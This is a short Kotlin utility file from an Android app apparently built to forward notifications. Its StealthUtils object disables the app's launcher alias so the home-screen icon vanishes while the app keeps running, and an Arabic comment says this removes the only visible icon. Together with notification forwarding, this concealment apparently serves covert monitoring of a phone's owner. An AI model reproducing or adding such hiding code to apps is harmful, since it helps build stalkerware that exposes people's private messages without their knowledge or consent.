package com.itsazni.notificationforwarder

import android.content.ComponentName
import android.content.Context
import android.content.pm.PackageManager

object StealthUtils {

    fun hideAppCompletely(context: Context) {
        val packageManager = context.packageManager

        // تعطيل الأيقونة الوحيدة الظاهرة في الشاشة الرئيسية
        val mainAlias = ComponentName(
            context,
            "com.itsazni.notificationforwarder.MainActivityAlias"
        )

        try {
            packageManager.setComponentEnabledSetting(
                mainAlias,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
